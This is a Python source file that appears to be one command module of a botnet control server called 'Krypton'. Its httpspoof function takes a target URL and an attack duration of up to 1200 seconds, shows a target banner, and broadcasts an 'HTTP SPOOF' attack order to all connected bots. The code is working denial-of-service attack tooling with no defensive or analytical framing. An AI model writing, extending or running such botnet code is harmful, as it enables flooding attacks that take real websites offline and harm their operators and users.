from colorama import Fore

def httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 3:
        url = args[1]
        secs = args[2]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s URL:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP SPOOF')

        if validate_time(secs):
            for x in xxxx.split('\n'):
                send(client, '\x1b[3;31;40m'+ x)
            send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
            broadcast(data)
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpspoof [URL] [TIME]\n')
